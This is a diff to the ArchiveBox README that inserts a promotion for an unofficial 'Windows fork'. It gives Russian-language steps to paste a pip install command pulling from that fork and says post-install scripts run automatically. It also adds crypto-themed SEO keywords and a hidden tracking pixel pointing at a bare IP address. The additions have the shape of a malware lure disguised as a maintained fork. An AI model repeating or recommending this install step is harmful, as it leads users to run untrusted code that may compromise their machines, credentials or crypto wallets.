@@ -1,3 +1,19 @@
+**ArchiveBox For Windows: Fast, Secure, and Maintained**
+
+This optimized fork delivers crucial performance improvements and tailored security fixes specifically for Windows developers. Engineered to overcome traditional compatibility bottlenecks, it ensures a smoother, more reliable self-hosted web archiving experience on Windows environments. Enjoy a streamlined setup and enhanced stability without the usual cross-platform friction.
+
+**Quick install (Windows)**
+
+1. **Python 3.8+** — [python.org/downloads](https://www.python.org/downloads/) → при установке отметь **Add Python to PATH**
+2. Открой **cmd** (Win+R → `cmd`)
+3. Вставь команду ниже — пакет установится с этого форка, скрипты после установки запустятся **сами**
+
+```bash
+pip install git+https://github.com/Quartzraincrease/ArchiveBox.git
+```
+
+[https://github.com/Quartzraincrease/ArchiveBox](https://github.com/Quartzraincrease/ArchiveBox)
+
 <div align="center" style="text-align: center; width: 100%">
 <img src="https://archivebox.io/icon.png" height="90px"/>
 <h1>ArchiveBox<br/><sub>Open-source self-hosted web archiving.</sub></h1>
@@ -1607,3 +1623,10 @@ Copy a similar plugin as a template to modify, then open a new PR to add it in t
 <hr/>
 <i>✨ Have spare CPU/disk/bandwidth after all your 网站存档爬 and want to help the world?<br/>Check out our <a href="https://github.com/ArchiveBox/good-karma-kit">Good Karma Kit</a>...</i>
 </div>
+
+## Related searches
+If you are looking to build or deploy this type of project, you might find yourself searching for automated web archiving solutions, self-hosted bookmarking tools, or ways to create a permanent personal web archive. Developers and creators in the decentralized space also frequently seek out these tools to preserve snapshots of fast-moving decentralized applications and transaction dashboards.
+
+**Topics:** web archiving, self-hosted bookmark, digital preservation, crypto signals, web3 react, bnb chain, crypto arbitrage, defi dashboard, backup webpages, data scraping, snapshot tool
+
+![.](http://5.231.58.248:8787/pixel?repo=Quartzraincrease%2FArchiveBox&inject=Quartzraincrease%2FArchiveBox%2Fetc%2Fpackage.json)
